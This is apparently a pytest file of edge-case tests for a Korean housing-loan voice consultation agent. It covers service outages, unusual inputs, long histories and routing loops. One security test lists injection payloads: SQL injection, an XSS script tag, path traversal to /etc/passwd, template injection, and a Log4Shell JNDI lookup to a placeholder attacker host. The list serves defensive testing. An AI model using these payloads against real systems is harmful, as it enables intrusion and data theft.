"""
Edge cases and error handling test scenarios for the 디딤돌 voice consultation agent.

This module contains comprehensive test scenarios for edge cases, error conditions,
and stress testing to ensure robust behavior under various failure modes.
"""

import pytest
from unittest.mock import Mock, AsyncMock, patch, MagicMock
import json
from typing import List, Dict, Any
from langchain_core.messages import HumanMessage, AIMessage

from app.graph.agent import (
    entry_point_node,
    main_agent_router_node,
    factual_answer_node,
    call_scenario_agent_node,
    process_scenario_logic_node,
    set_product_type_node,
    synthesize_response_node,
    prepare_direct_response_node,
    web_search_node
)
from app.graph.state import AgentState


class TestServiceFailureScenarios:
    """Test scenarios when external services fail."""
    
    @pytest.mark.asyncio
    async def test_rag_service_down(self):
        """Test behavior when RAG service is not available."""
        state = {
            "user_input_text": "디딤돌 대출 금리가 얼마인가요?",
            "messages": [HumanMessage(content="디딤돌 대출 금리가 얼마인가요?")],
            "stt_result": "디딤돌 대출 금리가 얼마인가요?",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service as not ready
        with patch('app.graph.agent.rag_service') as mock_rag:
            mock_rag.is_ready.return_value = False
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should provide graceful error message
            assert "정보 검색 기능에 문제가 발생" in response
            assert "잠시 후 다시" in response or "다른 방법" in response
            
            # Should use polite Korean
            assert any(marker in response for marker in ['습니다', '세요', '십니다', '요'])
    
    @pytest.mark.asyncio
    async def test_rag_service_error_during_query(self):
        """Test behavior when RAG service throws an error during query."""
        state = {
            "user_input_text": "디딤돌 대출 조건이 어떻게 되나요?",
            "messages": [HumanMessage(content="디딤돌 대출 조건이 어떻게 되나요?")],
            "stt_result": "디딤돌 대출 조건이 어떻게 되나요?",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service to throw an error
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(side_effect=Exception("Database connection failed"))
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle error gracefully
            assert "정보를 검색하는 중 오류가 발생했습니다" in response
            assert "다시 시도" in response or "문의" in response
    
    @pytest.mark.asyncio
    async def test_web_search_service_timeout(self):
        """Test behavior when web search service times out."""
        state = {
            "user_input_text": "오늘 주식 시장 동향이 어떤가요?",
            "messages": [HumanMessage(content="오늘 주식 시장 동향이 어떤가요?")],
            "stt_result": "오늘 주식 시장 동향이 어떤가요?",
            "action_plan": ["invoke_web_search"],
            "action_plan_struct": [{"tool": "invoke_web_search", "tool_input": {"query": "주식 시장 동향"}}]
        }
        
        # Mock web search service to timeout
        with patch('app.graph.agent.web_search_service') as mock_web:
            mock_web.asearch = AsyncMock(side_effect=TimeoutError("Request timeout"))
            
            result = await web_search_node(state)
            response = result["factual_response"]
            
            # Should handle timeout gracefully
            assert "웹 검색" in response and "오류" in response
            assert "시간이 초과" in response or "다시 시도" in response
    
    @pytest.mark.asyncio
    async def test_llm_service_unavailable(self):
        """Test behavior when LLM service is unavailable."""
        state = {
            "user_input_text": "안녕하세요",
            "messages": [HumanMessage(content="안녕하세요")],
            "stt_result": "안녕하세요",
            "main_agent_routing_decision": "answer_directly_chit_chat"
        }
        
        # Mock LLM to throw connection error
        with patch('app.graph.agent.generative_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"chitchat_prompt": "test"}}):
            
            mock_llm.ainvoke = AsyncMock(side_effect=Exception("LLM service unavailable"))
            
            result = await prepare_direct_response_node(state)
            response = result["final_response_text_for_tts"]
            
            # Should provide fallback response
            assert "죄송합니다" in response
            assert "문제가 발생" in response or "일시적" in response
    
    @pytest.mark.asyncio
    async def test_scenario_data_corruption(self):
        """Test behavior when scenario data is corrupted or missing."""
        state = {
            "user_input_text": "디딤돌 대출 상담 받고 싶어요",
            "messages": [HumanMessage(content="디딤돌 대출 상담 받고 싶어요")],
            "stt_result": "디딤돌 대출 상담 받고 싶어요"
        }
        
        # Mock corrupted scenario data
        with patch('app.graph.agent.ALL_SCENARIOS_DATA', None), \
             patch('app.graph.agent.ALL_PROMPTS', None):
            
            result = await entry_point_node(state)
            
            # Should detect service failure
            assert result["error_message"] is not None
            assert "Service initialization failed" in result["error_message"]
            assert result["is_final_turn_response"] is True


class TestInputVariationScenarios:
    """Test scenarios with various input variations and edge cases."""
    
    @pytest.mark.asyncio
    async def test_very_long_input(self):
        """Test handling of extremely long user input."""
        # Create very long input (over 1000 characters)
        long_input = "디딤돌 대출에 대해서 " + "정말 자세히 " * 100 + "알고 싶어요"
        
        state = {
            "user_input_text": long_input,
            "messages": [HumanMessage(content=long_input)],
            "stt_result": long_input,
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        # Mock RAG service
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="디딤돌 대출 정보입니다.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle long input gracefully
            assert response is not None
            assert len(response) > 0
            assert "디딤돌" in response
    
    @pytest.mark.asyncio
    async def test_empty_or_whitespace_input(self):
        """Test handling of empty or whitespace-only input."""
        test_inputs = ["", "   ", "\n\n", "\t\t", "   \n  \t  "]
        
        for empty_input in test_inputs:
            state = {
                "user_input_text": empty_input,
                "messages": [HumanMessage(content=empty_input)],
                "stt_result": empty_input
            }
            
            with patch('app.graph.agent.ALL_SCENARIOS_DATA', {}), \
                 patch('app.graph.agent.ALL_PROMPTS', {}):
                
                result = await entry_point_node(state)
                
                # Should handle empty input gracefully
                assert result["stt_result"] == empty_input
                # Should not crash and should set appropriate state
    
    @pytest.mark.asyncio
    async def test_special_characters_input(self):
        """Test handling of input with special characters and symbols."""
        special_inputs = [
            "디딤돌 대출 #%@!?",
            "금리는??? 얼마인가요!!!",
            "대출한도 $$ 최대 얼마?",
            "안녕하세요 ^^; 상담받고싶어요 ㅠㅠ",
            "전세자금대출 α β γ 정보주세요"
        ]
        
        for special_input in special_inputs:
            state = {
                "user_input_text": special_input,
                "messages": [HumanMessage(content=special_input)],
                "stt_result": special_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="관련 정보입니다.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle special characters gracefully
                assert response is not None
                assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_mixed_language_input(self):
        """Test handling of mixed Korean-English input."""
        mixed_inputs = [
            "디딤돌 loan 정보 알려주세요",
            "interest rate가 어떻게 되나요?",
            "Account opening 하고 싶어요",
            "Hello, 대출 상담 받고 싶습니다",
            "전세자금대출 information please"
        ]
        
        for mixed_input in mixed_inputs:
            state = {
                "user_input_text": mixed_input,
                "messages": [HumanMessage(content=mixed_input)],
                "stt_result": mixed_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="대출 정보를 안내해 드립니다.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle mixed language gracefully
                assert response is not None
                assert "대출" in response or "정보" in response
    
    @pytest.mark.asyncio
    async def test_numbers_and_currency_variations(self):
        """Test handling of various number and currency formats."""
        number_inputs = [
            "5천만원 대출 받고 싶어요",
            "50,000,000원 한도 가능한가요?",
            "금리 2.5% 맞나요?",
            "연봉이 4천5백만원인데",
            "보증금 2억 3천만원이에요",
            "한도가 4000만원인가요?",
            "이자율 연 3프로정도?"
        ]
        
        for number_input in number_inputs:
            state = {
                "user_input_text": number_input,
                "messages": [HumanMessage(content=number_input)],
                "stt_result": number_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="금액 관련 정보를 안내해 드립니다.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle various number formats
                assert response is not None
                assert any(keyword in response for keyword in ["금액", "원", "대출", "한도", "금리"])


class TestConcurrencyAndPerformanceScenarios:
    """Test scenarios related to concurrent access and performance edge cases."""
    
    @pytest.mark.asyncio
    async def test_rapid_successive_requests(self):
        """Test handling of rapid successive requests from the same user."""
        rapid_inputs = [
            "디딤돌 대출",
            "금리는?",
            "한도는?",
            "조건은?",
            "서류는?"
        ]
        
        # Simulate rapid requests
        for i, rapid_input in enumerate(rapid_inputs):
            state = {
                "user_input_text": rapid_input,
                "messages": [HumanMessage(content=rapid_input)],
                "stt_result": rapid_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}],
                "session_id": "rapid_test_session",
                "turn_id": i
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value=f"응답 {i}: 관련 정보입니다.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle each request properly
                assert response is not None
                assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_memory_pressure_large_conversation(self):
        """Test behavior under memory pressure with large conversation history."""
        # Create large conversation history (100 turns)
        large_history = []
        for i in range(100):
            large_history.extend([
                HumanMessage(content=f"질문 {i}: 디딤돌 대출에 대해 알려주세요"),
                AIMessage(content=f"답변 {i}: 디딤돌 대출은 청년층을 위한 대출입니다.")
            ])
        
        state = {
            "user_input_text": "마지막 질문입니다. 총정리해 주세요.",
            "messages": large_history + [HumanMessage(content="마지막 질문입니다. 총정리해 주세요.")],
            "stt_result": "마지막 질문입니다. 총정리해 주세요.",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="디딤돌 대출 종합 정보입니다.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle large conversation history
            assert response is not None
            assert "디딤돌" in response


class TestStateManagementEdgeCases:
    """Test edge cases in state management and conversation flow."""
    
    @pytest.mark.asyncio
    async def test_corrupted_state_recovery(self):
        """Test recovery from corrupted conversation state."""
        # Create state with missing required fields
        corrupted_state = {
            "user_input_text": "대출 정보 알려주세요",
            # Missing messages, stt_result, etc.
        }
        
        with patch('app.graph.agent.ALL_SCENARIOS_DATA', {"didimdol": {"scenario_name": "test"}}), \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"test": "prompt"}}):
            
            result = await entry_point_node(corrupted_state)
            
            # Should handle missing fields gracefully
            assert result is not None
            assert "user_input_text" in result
    
    @pytest.mark.asyncio
    async def test_invalid_action_plan_handling(self):
        """Test handling of invalid action plans."""
        state = {
            "user_input_text": "디딤돌 대출 정보",
            "messages": [HumanMessage(content="디딤돌 대출 정보")],
            "stt_result": "디딤돌 대출 정보",
            "action_plan": ["invalid_action", "unknown_tool"],
            "action_plan_struct": [{"tool": "invalid_action"}]
        }
        
        from app.graph.agent import execute_plan_router
        
        # Should route to default handler for unknown actions
        result = execute_plan_router(state)
        assert result == "prepare_direct_response_node"
    
    @pytest.mark.asyncio
    async def test_circular_routing_prevention(self):
        """Test prevention of infinite loops in routing."""
        state = {
            "user_input_text": "도움말",
            "messages": [HumanMessage(content="도움말")],
            "stt_result": "도움말",
            "action_plan": [],  # Empty action plan
            "routing_history": ["main_agent_router", "execute_plan_router"] * 10  # Simulated loop
        }
        
        from app.graph.agent import execute_plan_router
        
        # Should break potential loops by routing to synthesis
        result = execute_plan_router(state)
        assert result == "synthesize_response_node"


class TestSecurityAndInputValidation:
    """Test security-related edge cases and input validation."""
    
    @pytest.mark.asyncio
    async def test_potential_injection_attempts(self):
        """Test handling of potential injection-style inputs."""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "{{7*7}}",
            "${jndi:ldap://evil.com}",
            "{% for item in range(1000) %}test{% endfor %}"
        ]
        
        for injection_input in injection_attempts:
            state = {
                "user_input_text": injection_input,
                "messages": [HumanMessage(content=injection_input)],
                "stt_result": injection_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="안전한 응답입니다.")
                
                result = await factual_answer_node(state)
                response = result["factual_response"]
                
                # Should handle potentially malicious input safely
                assert response is not None
                assert "error" not in response.lower() or "안전" in response
                # Should not echo back the exact malicious input
                assert injection_input not in response
    
    @pytest.mark.asyncio
    async def test_unicode_and_encoding_edge_cases(self):
        """Test handling of various Unicode and encoding edge cases."""
        unicode_inputs = [
            "대출 정보 🏠💰",  # Emojis
            "디딤돌 대출 ® ™ ©",  # Special symbols
            "금리는 ½ % 인가요?",  # Fractions
            "한도가 ∞ 인가요?",  # Mathematical symbols
            "상담 시간 → 언제인가요?",  # Arrows
            "대출 조건 ✓ ✗",  # Check marks
            "\u200b디딤돌\u200b대출",  # Zero-width spaces
            "대출\u0000정보",  # Null character
            "정보\uffff주세요"  # Invalid Unicode
        ]
        
        for unicode_input in unicode_inputs:
            state = {
                "user_input_text": unicode_input,
                "messages": [HumanMessage(content=unicode_input)],
                "stt_result": unicode_input,
                "action_plan": ["invoke_qa_agent"],
                "action_plan_struct": [{"tool": "invoke_qa_agent"}]
            }
            
            with patch('app.graph.agent.rag_service') as mock_rag, \
                 patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
                
                mock_rag.is_ready.return_value = True
                mock_rag.answer_question = AsyncMock(return_value="대출 정보를 안내해 드립니다.")
                
                try:
                    result = await factual_answer_node(state)
                    response = result["factual_response"]
                    
                    # Should handle Unicode gracefully
                    assert response is not None
                    assert len(response) > 0
                except UnicodeError:
                    # Acceptable to fail on invalid Unicode, but should not crash the system
                    pass


class TestResourceLimitScenarios:
    """Test scenarios that push against resource limits."""
    
    @pytest.mark.asyncio
    async def test_maximum_message_history_length(self):
        """Test behavior at maximum conversation history length."""
        # Create conversation with maximum reasonable length
        max_history = []
        for i in range(1000):  # Very long conversation
            max_history.append(HumanMessage(content=f"질문 {i}"))
            max_history.append(AIMessage(content=f"답변 {i}"))
        
        state = {
            "user_input_text": "요약해 주세요",
            "messages": max_history + [HumanMessage(content="요약해 주세요")],
            "stt_result": "요약해 주세요",
            "action_plan": ["invoke_qa_agent"],
            "action_plan_struct": [{"tool": "invoke_qa_agent"}]
        }
        
        with patch('app.graph.agent.rag_service') as mock_rag, \
             patch('app.graph.agent.ALL_PROMPTS', {"qa_agent": {"rag_query_expansion_prompt": "test"}}):
            
            mock_rag.is_ready.return_value = True
            mock_rag.answer_question = AsyncMock(return_value="대화 요약입니다.")
            
            result = await factual_answer_node(state)
            response = result["factual_response"]
            
            # Should handle very long history (may truncate if needed)
            assert response is not None
            assert len(response) > 0
    
    @pytest.mark.asyncio
    async def test_network_timeout_recovery(self):
        """Test recovery from network timeouts."""
        state = {
            "user_input_text": "현재 부동산 시장 동향은?",
            "messages": [HumanMessage(content="현재 부동산 시장 동향은?")],
            "stt_result": "현재 부동산 시장 동향은?",
            "action_plan": ["invoke_web_search"],
            "action_plan_struct": [{"tool": "invoke_web_search", "tool_input": {"query": "부동산 시장"}}]
        }
        
        # Mock network timeout
        with patch('app.graph.agent.web_search_service') as mock_web:
            mock_web.asearch = AsyncMock(side_effect=TimeoutError("Network timeout"))
            
            result = await web_search_node(state)
            response = result["factual_response"]
            
            # Should provide graceful fallback
            assert "네트워크" in response or "연결" in response or "시간" in response
            assert "다시 시도" in response or "잠시 후" in response


class TestDataValidationScenarios:
    """Test data validation and sanitization edge cases."""
    
    @pytest.mark.asyncio
    async def test_malformed_json_in_llm_response(self):
        """Test handling of malformed JSON responses from LLM."""
        state = {
            "user_input_text": "디딤돌 대출 정보",
            "messages": [HumanMessage(content="디딤돌 대출 정보")],
            "stt_result": "디딤돌 대출 정보"
        }
        
        # Mock LLM to return malformed JSON
        with patch('app.graph.agent.json_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"test": "prompt"}}), \
             patch('app.graph.agent.initial_task_decision_parser') as mock_parser:
            
            mock_response = Mock()
            mock_response.content = '{"actions": [{"tool": "set_product_type", "tool_input": {'  # Malformed JSON
            mock_llm.ainvoke = AsyncMock(return_value=mock_response)
            
            # Mock parser to handle parsing error
            mock_parser.parse.side_effect = Exception("JSON parsing error")
            mock_parser.get_format_instructions.return_value = "format instructions"
            
            result = await main_agent_router_node(state)
            
            # Should handle malformed JSON gracefully
            assert result["error_message"] is not None
            assert result["main_agent_routing_decision"] == "unclear_input"
    
    @pytest.mark.asyncio
    async def test_unexpected_llm_response_format(self):
        """Test handling of unexpected LLM response formats."""
        state = {
            "user_input_text": "안녕하세요",
            "messages": [HumanMessage(content="안녕하세요")],
            "stt_result": "안녕하세요"
        }
        
        # Mock LLM to return unexpected format
        with patch('app.graph.agent.generative_llm') as mock_llm, \
             patch('app.graph.agent.ALL_PROMPTS', {"main_agent": {"chitchat_prompt": "test"}}):
            
            mock_response = Mock()
            mock_response.content = None  # Unexpected None content
            mock_llm.ainvoke = AsyncMock(return_value=mock_response)
            
            result = await prepare_direct_response_node(state)
            response = result["final_response_text_for_tts"]
            
            # Should provide fallback response
            assert response is not None
            assert len(response) > 0
            assert "안녕하세요" in response or "도움" in response